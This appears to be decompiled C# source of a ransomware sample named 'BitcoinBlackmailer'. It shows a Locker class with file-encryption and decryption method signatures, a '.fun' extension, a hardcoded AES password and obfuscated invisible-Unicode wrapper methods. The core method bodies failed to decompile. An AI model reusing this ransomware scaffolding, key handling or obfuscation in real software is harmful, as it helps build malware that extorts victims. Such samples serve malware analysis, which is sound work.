// Decompiled with JetBrains decompiler
// Type: Main.Tools.Locker
// Assembly: BitcoinBlackmailer, Version=37.0.2.5583, Culture=neutral, PublicKeyToken=null
// MVID: 628485CE-1750-4702-9367-C5FFF8321F79
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\Trojan-Ransom.Win32.Agent.iqf-3ae96f73d805e1d3995253db4d910300d8442ea603737a1428b613061e7f61e7.exe

using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace Main.Tools
{
  internal static class Locker
  {
    private static readonly string EncryptedFileListPath;
    private static readonly HashSet<string> EncryptedFiles;
    private const string EncryptionFileExtension = ".fun";
    private const string EncryptionPassword = "OoIsAwwF23cICQoLDA0ODe==";

    internal static void EncryptFileSystem()
    {
      // ISSUE: unable to decompile the method.
    }

    internal static HashSet<string> GetEncryptedFiles()
    {
      // ISSUE: unable to decompile the method.
    }

    private static string CreateFileSystemSimulation()
    {
      // ISSUE: unable to decompile the method.
    }

    private static IEnumerable<string> GetExtensionsToEncrypt()
    {
      // ISSUE: unable to decompile the method.
    }

    private static IEnumerable<string> GetFiles(string path)
    {
      // ISSUE: unable to decompile the method.
    }

    private static void EncryptFiles(
      string dirPath,
      string encryptionExtension,
      HashSet<string> extensionsToEncrypt)
    {
      // ISSUE: unable to decompile the method.
    }

    internal static void DecryptFiles(string encryptionExtension)
    {
      // ISSUE: unable to decompile the method.
    }

    private static bool EncryptFile(string path, string encryptionExtension)
    {
      // ISSUE: unable to decompile the method.
    }

    private static void DecryptFile(string path, string encryptionExtension)
    {
      // ISSUE: unable to decompile the method.
    }

    private static void EncryptFile(SymmetricAlgorithm alg, string inputFile, string outputFile)
    {
      // ISSUE: unable to decompile the method.
    }

    private static void DecryptFile(SymmetricAlgorithm alg, string inputFile, string outputFile)
    {
      // ISSUE: unable to decompile the method.
    }

    static Locker()
    {
      // ISSUE: unable to decompile the method.
    }

    static DriveInfo[] \u206E‮‫⁭⁪‬⁫‍‬‎‪‫‭‫⁭‮‌‪⁭⁬‍‌‎‬‌‪‌‍‫⁯‮‏‭⁬‍‫‪‎⁯⁫‮() => DriveInfo.GetDrives();

    static bool \u206C‫‍⁯‏⁬⁫‬‎‫⁮⁯‫‎‏‍‪‌‎‏‬‎‎‭⁪‮⁮‏‪‏⁫⁮⁯⁪⁯‮⁮‭⁫‬‮([In] IEnumerator obj0) => obj0.MoveNext();

    static void \u206F‍‌⁯⁫⁭‮⁬‬‬‪‬​‍⁫⁯‎‫⁮‌⁮⁫‍​‌⁮⁮‏⁫‎‮‮‏‏‎‬‏‍⁪‌‮([In] IDisposable obj0) => obj0.Dispose();

    static bool \u202A‮⁬‭‫‌‭‌‍‬⁫​⁬‌‪⁬‏⁮‭⁪‮⁭‏‪⁯‎‌‮⁭​⁮⁬‭‍⁯⁭‮⁭‍‍‮([In] string obj0) => File.Exists(obj0);

    static void \u206F‭⁫⁮⁭‬⁯‬‭⁭⁬‪⁯⁮‭‭‫⁪⁮‫⁯⁬⁬‏‭​‬‪‍‭⁪‭⁯⁪‏⁭‎⁯‎‮‮([In] string obj0, [In] string[] obj1) => File.WriteAllLines(obj0, obj1);

    static string[] \u202E⁫⁭‮⁯​‮‏⁪‪⁭​‫‎⁬‏⁫‪‎‫‪⁫​‏​⁬‪‏‬‌‭⁪​‪⁭⁭‏⁮⁪⁬‮([In] string obj0) => File.ReadAllLines(obj0);

    static string \u206D⁬⁫‬‌⁯​⁬⁯‭‏‍‏‬⁯‌‪⁬‎‫‌‮‬​‭⁮‍‮​‮‭⁬‍⁫⁯‮⁬⁯⁮⁫‮([In] string obj0, [In] string obj1) => Path.Combine(obj0, obj1);

    static bool \u206C‮‏‏‬⁯‮⁮⁮‮⁫‭⁫‌⁪⁯‏‍⁪‍‪⁫‎⁫‮‪‌‭⁫⁬‮‭​‭‪‬‬⁭⁯‭‮([In] string obj0) => Directory.Exists(obj0);

    static DirectoryInfo \u206A‫‪‍⁭‬‍⁭⁭⁯‌‪‎‍⁫​⁫‫‫‎⁮⁭⁪​⁮⁯⁯⁫‏⁫‍⁯‮‌‏⁭‪​⁯⁬‮([In] string obj0) => Directory.CreateDirectory(obj0);

    static StreamWriter \u202A‭​⁬⁫⁬​‪‎‏⁪⁭⁪​‎‪‪⁪‫⁭‮‏⁫‏‮⁮‪‍‮‎‪‫‍⁭‬‎⁪‮‭‏‮(
      [In] string obj0,
      [In] bool obj1)
    {
      return new StreamWriter(obj0, obj1);
    }

    static void \u206F‮​​⁮⁬‬‮​​⁪‏⁬⁬⁭⁮​‎⁮⁪⁫‭⁭‫‏⁫‍‮⁫⁫‮​‭⁮‍⁯⁮‫‫‮‮([In] TextWriter obj0, [In] string obj1) => obj0.WriteLine(obj1);

    static string \u206F‮‫‬‮⁭‪‍‮⁫‫‭‪⁮⁭​‪‭‫⁯⁮‮‍⁪‌​‍‫⁪⁬‭‪‌⁪‏⁬‬‍⁭‮() => Environment.NewLine;

    static string[] \u202D‪‭⁫⁯⁯‎⁭‌‭​⁪⁮‬⁭‬⁯⁭⁮⁭‭‎⁫⁯‪⁯⁯‏‮‬‫‏‎‭⁫‬‎​‮‮‮(
      [In] string obj0,
      [In] string[] obj1,
      [In] StringSplitOptions obj2)
    {
      return obj0.Split(obj1, obj2);
    }

    static string \u202B⁪‏‫⁬‌⁯⁯‌‬⁪⁮‌‫‭‌‍​‪⁭‭‮⁬⁭‪​⁮‏‭‎‌⁮⁪‫⁫‪⁮‬‬‭‮([In] string obj0) => obj0.Trim();

    static string \u206B⁮‭‭‬‎‫⁮‬‮⁬⁫⁭⁪‌⁪‫‎⁬‪⁬⁮‪‍‎⁫‮‬⁮​⁯⁭⁬⁯‮⁯⁭​‪‏‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static void \u200B⁭‎‭‮⁪⁬⁪‮⁮‍‪‮‪‫⁫‪‫‪⁮‎‭⁯‏​⁪‏⁪‭⁪‏‎​‏‫‪​‏⁬⁬‮([In] string obj0) => File.Delete(obj0);

    static bool \u200C⁭⁫⁮⁫‮‪‍‏‍⁪‍‭⁪‌⁮‮‎⁮‎‏‭​‮⁮⁪‍‏‏⁮‎⁯⁯⁪​‪⁯‫‎⁭‮(
      [In] string obj0,
      [In] string obj1,
      [In] StringComparison obj2)
    {
      return obj0.StartsWith(obj1, obj2);
    }

    static AesCryptoServiceProvider \u200F‏‬‪⁯‍⁬‌‏‪⁪‭‫‭‌‍‫⁫‫‌​‪​⁬‎‬‍‭‌⁫‏‪‌‍⁬‬⁯⁮‌⁬‮() => new AesCryptoServiceProvider();

    static byte[] \u206B⁫‍⁮⁪‌‭‭⁮‮‮​‬‏⁪‪‪‌‭⁯‫‬‮‏​‎‪‍​⁭‍‮‪⁯⁯‌⁮‍⁯‮‮([In] string obj0) => Convert.FromBase64String(obj0);

    static void \u206D‌‬‎‍⁮‍‪‏⁬‎⁪‎‪⁪⁫‭⁯​​⁯‎‬‫‌‎‬‌⁬⁯‪‌‭‭‮‬‪‬⁮⁯‮([In] SymmetricAlgorithm obj0, [In] byte[] obj1) => obj0.Key = obj1;

    static void \u202A​⁫‫⁯⁭⁬‏‎‬⁬‏‭⁯‎‭‬⁯⁯⁫‬⁮‮‭⁬‏⁮​‬⁬‫⁯‬‍‫‫‪⁯‫‬‮([In] Array obj0, [In] RuntimeFieldHandle obj1) => RuntimeHelpers.InitializeArray(obj0, obj1);

    static void \u202A‭‪⁬‏⁭⁬​⁫⁫‌‍‭‎‍⁪‎‍‏‮‬⁯‎⁭‫‮⁭‏⁮‮‪⁬‌⁭⁪⁫⁯​⁪‮([In] SymmetricAlgorithm obj0, [In] byte[] obj1) => obj0.IV = obj1;

    static bool \u206E‬⁭⁬‍‌‌⁭‮‫‫‮⁪⁫⁬‬⁫⁮‏‌‪‎‍⁬‮​‬‏⁭‫‮‎‌⁫⁮​⁬⁮⁬⁫‮([In] string obj0, [In] string obj1) => obj0.EndsWith(obj1);

    static int \u206D⁫⁪‎‭⁮‫‮⁬‫‮‏‍⁫‪⁮‪‭‬​‎‎‭‫‪​‫​⁬⁪‬⁮‮​⁫⁬‍‬⁭‪‮([In] string obj0) => obj0.Length;

    static string \u202E⁬‎‎​‏‮‫⁯‭‪⁯⁬‌‎‏‫⁭‍‍‭‍⁬‭‮⁬⁯‭⁮⁪⁪⁯‏⁬⁪‮⁯⁫⁯‪‮([In] string obj0, [In] int obj1) => obj0.Remove(obj1);

    static FileStream \u206C⁮‫⁪‌​⁪⁫⁫‌‫​⁪‮‭‬‍‮⁮⁭‍‫‮⁫‌⁫⁮⁭⁭‪‍‌⁫‌‭‬⁮⁪⁭⁪‮(
      [In] string obj0,
      [In] FileMode obj1)
    {
      return new FileStream(obj0, obj1);
    }

    static ICryptoTransform \u206B⁯⁬​⁫‮⁭‪⁬⁭⁭⁪‮‎‮‫⁫⁭‬‬‭​⁪⁪‫‭​‪‬‭‏⁬⁭‪‭‎‬‮‭‍‮(
      [In] SymmetricAlgorithm obj0)
    {
      return obj0.CreateEncryptor();
    }

    static CryptoStream \u202B‌​‏⁯⁪‎‌‫‭‪‭‪‬⁬⁯‎⁬⁫⁫‫⁮‎‎⁫‭‬⁫‬‏‌‮‍‫⁬⁫‪⁪‍‬‮(
      [In] Stream obj0,
      [In] ICryptoTransform obj1,
      [In] CryptoStreamMode obj2)
    {
      return new CryptoStream(obj0, obj1, obj2);
    }

    static int \u206E‏⁫‬‮⁮‏‍⁪⁪⁫⁯​‌⁮‏⁮⁪‌‍⁯⁫‫‪​‭⁯‬‎‬‍⁬⁪‬⁯‪‍‎‬‬‮(
      [In] Stream obj0,
      [In] byte[] obj1,
      [In] int obj2,
      [In] int obj3)
    {
      return obj0.Read(obj1, obj2, obj3);
    }

    static void \u200D⁭⁯‬‭⁮⁬‫‎‬⁬‭⁬⁫⁬⁪‮‪‏​‏​‮‪​⁯‮‫‭‫⁫‭‎​⁭⁭‭⁮⁮⁪‮(
      [In] Stream obj0,
      [In] byte[] obj1,
      [In] int obj2,
      [In] int obj3)
    {
      obj0.Write(obj1, obj2, obj3);
    }

    static ICryptoTransform \u206E‮‌‍‎‫​‮‍‫‎‫‮⁮‏‎⁪⁭‏‭‎⁬‍⁭⁪‬⁬​⁯‪⁯‌‬‌⁮‌‎‏⁭‍‮(
      [In] SymmetricAlgorithm obj0)
    {
      return obj0.CreateDecryptor();
    }
  }
}
